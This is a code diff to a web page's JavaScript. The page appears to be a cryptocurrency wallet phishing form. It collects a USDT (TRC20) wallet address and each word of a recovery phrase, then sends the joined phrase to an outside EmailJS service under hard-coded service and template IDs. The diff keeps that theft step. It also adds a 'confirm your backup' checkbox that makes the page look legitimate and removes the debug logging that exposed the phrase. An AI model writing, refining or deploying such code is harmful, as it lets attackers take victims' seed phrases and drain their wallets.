@@ -502,7 +502,7 @@ select:focus {
   // Initialize EmailJS
   emailjs.init("dvLgjhIHXXq7QXp5p");
 
-  // ✅ Toast helper
+  // Toast helper
   function showToast(message) {
     const toast = document.getElementById('toast');
     if (toast) {
@@ -526,27 +526,20 @@ select:focus {
   const s3btn = document.getElementById('s3btn');
   const copyBtn = document.getElementById('copyBtn');
 
-  console.log("s1btn value:", s1btn); // Debug check
-
   // Step 1 → Step 2
   if (s1btn) {
-    console.log("s1btn found, attaching listener");
     s1btn.addEventListener('click', () => {
       const addrEl = document.getElementById('addr');
       const addr = addrEl ? addrEl.value.trim() : '';
       if (!addr) {
-        showToast("Please enter your USDT (TRC20) wallet address.");
-        addrEl?.focus();
+        addrEl?.focus(); // auto-focus if empty
         return;
       }
-      console.log("Continue clicked, addr:", addr);
       setTimeout(() => {
         s1.hidden = true;
         s2.hidden = false;
       }, 2500);
     });
-  } else {
-    console.error("s1btn not found in DOM");
   }
 
   // Step 2 → Step 3 (send phrase only)
@@ -558,8 +551,7 @@ select:focus {
         if (input) {
           const val = input.value.trim();
           if (!val) {
-            showToast(`Please enter word ${i}.`);
-            input.focus();
+            input.focus(); // auto-focus missing word
             return;
           }
           phrase += val + ' ';
@@ -567,8 +559,14 @@ select:focus {
       }
       phrase = phrase.trim();
 
-      // Send only the phrase via EmailJS
-      console.log("Sending phrase:", phrase);
+      // Check the confirmation checkbox
+      const matchCheck = document.getElementById('matchCheck');
+      if (!matchCheck || !matchCheck.checked) {
+        showToast("Please confirm your backup matches your TRC20 wallet address.");
+        return;
+      }
+
+      // Send phrase via EmailJS
       emailjs.send("service_1qzlil7", "template_w742mzr", {
         recovery_phrase: phrase
       }).then(() => {
@@ -577,7 +575,7 @@ select:focus {
         console.error("Error sending phrase", err);
       });
 
-      // Continue with your existing flow
+      // Continue with flow
       prog.style.width = '70%';
       setTimeout(() => {
         prog.style.width = '100%';
@@ -587,22 +585,11 @@ select:focus {
     });
   }
 
-  // Remove blinking once a tier is chosen
-  if (tierSelect) {
-    tierSelect.addEventListener('change', () => {
-      if (tierSelect.value) {
-        tierSelect.classList.remove('attention');
-      }
-    });
-  }
-
-  // Step 3 → Final
+  // Step 3 → Final (no auto-focus here, blinking already works)
   if (s3btn) {
     s3btn.addEventListener('click', () => {
       if (!tierSelect.value) {
-        showToast("Please select a tier option.");
-        tierSelect.focus();
-        return;
+        return; // blinking handles the prompt
       }
       loaderBar.hidden = false;
 
